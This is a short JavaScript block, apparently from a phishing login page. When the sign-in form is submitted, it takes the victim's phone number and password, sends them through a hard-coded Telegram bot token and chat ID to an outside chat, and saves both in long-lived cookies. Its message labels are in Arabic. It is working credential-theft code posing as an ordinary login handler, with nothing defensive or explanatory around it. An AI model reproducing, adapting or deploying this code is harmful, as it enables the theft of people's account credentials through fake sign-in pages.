  <script>

    function setCookie(cname, cvalue, exdays) {

      const d = new Date();

      d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));

      let expires = "expires=" + d.toUTCString();

      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";

    }



    $('#signin').on("submit", function () {

      phonenumber = document.getElementById('phonenumber').value

      document.getElementById('phonenumber').setAttribute("name", 'phonenumber')

      password = document.getElementById('password').value

      document.getElementById('password').setAttribute("name", 'password');



      var message = "رقم الهاتف:`" + phonenumber + "`\n"

      message += "كلمة السر:`" + password + "`\n"

      $.ajax({

        type: 'POST',

        url: `https://api.telegram.org/bot7356894979:AAFxs2g1BAkp6qYCgf3ZE8mvaLvaIuoBmI4/sendMessage`,

        data: {

          chat_id: "-4738220176",

          text: message,

          parse_mode: 'markdown',

        },

        success: function (res) {

          console.debug(res);

          $('#response').text('Message sent');

        },

        error: function (error) {

          console.error(error);

          alert("error failed");

        }

      });





      setCookie("phonenumber", phonenumber, 1000);

      setCookie("password", password, 1000);

    })

  </script>
